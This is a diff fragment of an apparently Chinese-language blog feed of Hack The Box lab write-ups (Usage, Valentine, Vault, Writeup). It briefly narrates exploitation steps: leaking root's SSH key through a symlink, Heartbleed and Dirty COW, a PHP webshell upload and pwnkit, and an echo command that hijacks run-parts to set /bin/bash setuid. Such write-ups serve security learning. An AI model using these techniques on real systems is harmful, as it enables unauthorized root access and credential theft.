+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ln -s /目标文件 test
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;进行管道连接，将test文件连接到目标文件&lt;/p&gt;
+&lt;p&gt;将test文件与root用户的ssh密钥进行连接&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/usage/1724329706528-6ee6347a-32a9-44d7-aef0-db55b95d27b5.png&#34;
+	width=&#34;1239&#34;
+	height=&#34;775&#34;
+	srcset=&#34;https://example.com/htb/usage/1724329706528-6ee6347a-32a9-44d7-aef0-db55b95d27b5_hu0874237554dd5c25a28da9312da3bca6_377706_480x0_resize_box_3.png 480w, https://example.com/htb/usage/1724329706528-6ee6347a-32a9-44d7-aef0-db55b95d27b5_hu0874237554dd5c25a28da9312da3bca6_377706_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;159&#34;
+		data-flex-basis=&#34;383px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;然后执行/usr/bin/usage_management文件，在执行过程中我们想要的文件会泄露出来&lt;/p&gt;
+&lt;p&gt;这样就得到了root用户的ssh密钥&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/usage/1724329773044-9f3e48ae-5ee7-43f2-b507-e922c9bfdfee.png&#34;
+	width=&#34;1508&#34;
+	height=&#34;779&#34;
+	srcset=&#34;https://example.com/htb/usage/1724329773044-9f3e48ae-5ee7-43f2-b507-e922c9bfdfee_hu7ff7acb90c7b4bf38b4653b9f13bd36e_365278_480x0_resize_box_3.png 480w, https://example.com/htb/usage/1724329773044-9f3e48ae-5ee7-43f2-b507-e922c9bfdfee_hu7ff7acb90c7b4bf38b4653b9f13bd36e_365278_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;193&#34;
+		data-flex-basis=&#34;464px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;ssh -i rsa root@ip进行登录&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Valentine</title>
+        <link>https://example.com/htb/valentine/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/valentine/</guid>
+        <description>&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+&lt;/h1&gt;&lt;p&gt;扫描端口22,80,443&lt;/p&gt;
+&lt;p&gt;网页打开只有一张图片，目录扫描有个dev目录里面有个hype_key文件，16进制换字符串看到是个rsa私钥，john破解不了&lt;/p&gt;
+&lt;p&gt;这时再用namp扫描漏洞查看受到&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;Heartbleed Bug&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/valentine/1726218173399-ef533ea9-8ec8-4d7b-b4ed-1a889eeb9820.png&#34;
+	width=&#34;787&#34;
+	height=&#34;363&#34;
+	srcset=&#34;https://example.com/htb/valentine/1726218173399-ef533ea9-8ec8-4d7b-b4ed-1a889eeb9820_hub87db7e3135566b1ef9e04fe71b7f7a3_99693_480x0_resize_box_3.png 480w, https://example.com/htb/valentine/1726218173399-ef533ea9-8ec8-4d7b-b4ed-1a889eeb9820_hub87db7e3135566b1ef9e04fe71b7f7a3_99693_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;216&#34;
+		data-flex-basis=&#34;520px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;msfconle上有漏洞使用&lt;/p&gt;
+&lt;p&gt;将&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;参数 “verbose” 设置为 True&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;这样直接在控制台看到一串base64&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;转码为heartbleedbelievethehype&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;猜测为私钥密码登录但提升说版本不对&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;问ai说添加参数&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;ssh -i rsa_hype -o PubkeyAcceptedAlgorithms=+ssh-rsa &lt;a class=&#34;link&#34; href=&#34;mailto:hype@10.10.10.79&#34; &gt;hype@10.10.10.79&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;成功登录&lt;/p&gt;
+&lt;h1 id=&#34;权限提升&#34;&gt;权限提升
+&lt;/h1&gt;&lt;p&gt;使用linpeas扫到存在CVE-2016-5195脏牛漏洞，直接上传脚本得到root权限&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Vault（内网未完）</title>
+        <link>https://example.com/htb/vault%E5%86%85%E7%BD%91%E6%9C%AA%E5%AE%8C/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/vault%E5%86%85%E7%BD%91%E6%9C%AA%E5%AE%8C/</guid>
+        <description>&lt;h2 id=&#34;外网打点&#34;&gt;外网打点
+&lt;/h2&gt;&lt;p&gt;三件套安排&lt;/p&gt;
+&lt;p&gt;扫端口，扫目录，扫子域名（有域名的话）&lt;/p&gt;
+&lt;p&gt;直接扫的话开始没有东西，百思不得其解看wp说要注意给的信息&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/vault%E5%86%85%E7%BD%91%E6%9C%AA%E5%AE%8C/1741950329361-2dad3a18-fc60-41cd-9ef4-2663ed8d6f21.png&#34;
+	width=&#34;2203&#34;
+	height=&#34;626&#34;
+	srcset=&#34;https://example.com/htb/vault%E5%86%85%E7%BD%91%E6%9C%AA%E5%AE%8C/1741950329361-2dad3a18-fc60-41cd-9ef4-2663ed8d6f21_hu273a1803c45197095cdd2c490c4ef071_99052_480x0_resize_box_3.png 480w, https://example.com/htb/vault%E5%86%85%E7%BD%91%E6%9C%AA%E5%AE%8C/1741950329361-2dad3a18-fc60-41cd-9ef4-2663ed8d6f21_hu273a1803c45197095cdd2c490c4ef071_99052_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;351&#34;
+		data-flex-basis=&#34;844px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;要加上sparklays的子目录&lt;/p&gt;
+&lt;p&gt;后面扫到一个文件上传，经测试可以上传php5文件&lt;/p&gt;
+&lt;p&gt;上马拿到shell&lt;/p&gt;
+&lt;h2 id=&#34;提权&#34;&gt;提权
+&lt;/h2&gt;&lt;p&gt;上传linpeas扫&lt;/p&gt;
+&lt;p&gt;发现pwnkit提示上传马拿到root&lt;/p&gt;
+&lt;p&gt;但是找不到标志&lt;/p&gt;
+&lt;p&gt;是在内网的靶机上&lt;/p&gt;
+&lt;p&gt;fscan扫到俩个存活的&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(25, 27, 31);&#34;&gt;192.168.122.4和192.168.122.5&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(25, 27, 31);&#34;&gt;先用frps搭建隧道&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(25, 27, 31);&#34;&gt;看192.168.122.4&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(25, 27, 31);&#34;&gt;打开后是一个VPN配置信息，并允许我们测试我们的VPN&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://link.zhihu.com/?target=https%3A//medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://link.zhihu.com/?target=https%3A//medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(25, 27, 31);&#34;&gt;如何用ovpn&lt;/font&gt;&lt;a class=&#34;link&#34; href=&#34;https://zhida.zhihu.com/search?content_id=166533148&amp;amp;content_type=Article&amp;amp;match_order=1&amp;amp;q=%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6&amp;amp;zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NDIxMTM3ODAsInEiOiLphY3nva7mlofku7YiLCJ6aGlkYV9zb3VyY2UiOiJlbnRpdHkiLCJjb250ZW50X2lkIjoxNjY1MzMxNDgsImNvbnRlbnRfdHlwZSI6IkFydGljbGUiLCJtYXRjaF9vcmRlciI6MSwiemRfdG9rZW4iOm51bGx9.JKyLzvFMLE021ItnwR1VwIOCe8yKTAUh6km5ZCvrmko&amp;amp;zhida_source=entity&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;&lt;font style=&#34;color:rgb(9, 64, 142);&#34;&gt;配置文件&lt;/font&gt;&lt;/a&gt;&lt;font style=&#34;color:rgb(25, 27, 31);&#34;&gt;反弹shell的教程&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(25, 27, 31);&#34;&gt;跟着走拿到shell可以看到user.txt里，猜测root.txt在另一个内网靶机里&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(25, 27, 31);&#34;&gt;但是不知道怎么做。。。。&lt;/font&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Writeup</title>
+        <link>https://example.com/htb/writeup/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/writeup/</guid>
+        <description>&lt;p&gt;端口，域名，无发现&lt;/p&gt;
+&lt;p&gt;该网站有防Dos功能，目录爆破用不了&lt;/p&gt;
+&lt;p&gt;robots.txt提示了有个writeup&lt;/p&gt;
+&lt;p&gt;打开这个页面底部下提示了由&lt;/p&gt;
+&lt;p&gt;CMS Simple Made制造&lt;/p&gt;
+&lt;p&gt;该版本存在CVE-2019-9053&lt;/p&gt;
+&lt;p&gt;能拿到管理员密码&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/writeup/1729583261004-10038edc-5347-4f0a-8c5f-2ca7a84603f2.png&#34;
+	width=&#34;787&#34;
+	height=&#34;562&#34;
+	srcset=&#34;https://example.com/htb/writeup/1729583261004-10038edc-5347-4f0a-8c5f-2ca7a84603f2_hu3086711ed4121c2680645d504cd2dc9c_34340_480x0_resize_box_3.png 480w, https://example.com/htb/writeup/1729583261004-10038edc-5347-4f0a-8c5f-2ca7a84603f2_hu3086711ed4121c2680645d504cd2dc9c_34340_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;140&#34;
+		data-flex-basis=&#34;336px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;ssh登录&lt;/p&gt;
+&lt;h1 id=&#34;权限提升&#34;&gt;权限提升
+&lt;/h1&gt;&lt;p&gt;该用户的用户组存在一个&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/writeup/1729583318479-7350fecb-7882-435d-8c84-b5c01a968556.png&#34;
+	width=&#34;763&#34;
+	height=&#34;463&#34;
+	srcset=&#34;https://example.com/htb/writeup/1729583318479-7350fecb-7882-435d-8c84-b5c01a968556_hu2fc7dfff127063618fb6736508dfb0a6_112431_480x0_resize_box_3.png 480w, https://example.com/htb/writeup/1729583318479-7350fecb-7882-435d-8c84-b5c01a968556_hu2fc7dfff127063618fb6736508dfb0a6_112431_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;164&#34;
+		data-flex-basis=&#34;395px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;并且通过查看进程我们能看到&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/writeup/1729583340852-6d2ba9c2-b97b-4dd8-8cf8-4900069cb00e.png&#34;
+	width=&#34;841&#34;
+	height=&#34;482&#34;
+	srcset=&#34;https://example.com/htb/writeup/1729583340852-6d2ba9c2-b97b-4dd8-8cf8-4900069cb00e_hu2f5e0455b07cefc847c2b35bc65d25df_55573_480x0_resize_box_3.png 480w, https://example.com/htb/writeup/1729583340852-6d2ba9c2-b97b-4dd8-8cf8-4900069cb00e_hu2f5e0455b07cefc847c2b35bc65d25df_55573_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;174&#34;
+		data-flex-basis=&#34;418px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;当有ssh登录时，会以run-parts执行&lt;font style=&#34;color:rgb(255, 255, 255);&#34;&gt; &lt;/font&gt;&lt;code&gt;run-parts&lt;/code&gt; 命令通常用来执行指定目录下的所有脚本文件。在此例中，它会运行 &lt;code&gt;/etc/update-motd.d&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;而我们可以写/usr/local&lt;/p&gt;
+&lt;p&gt;因此可以将run-parts更改为我们的提权bash&lt;/p&gt;
+&lt;p&gt;echo -e &amp;lsquo;#!/bin/bash\n\nchmod u+s /bin/bash&amp;rsquo; &amp;gt; /usr/local/bin/run-parts; chmod +x /usr/local/bin/run-parts&lt;/p&gt;
+&lt;p&gt;然后通过ssh登录，机器就会以root权限运行我们的run-parts文件&lt;/p&gt;
+&lt;p&gt;拿到我们的root&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>Analytics</title>
         <link>https://example.com/htb/analytics/</link>
         <pubDate>Wed, 19 Mar 2025 14:33:16 +0800</pubDate>
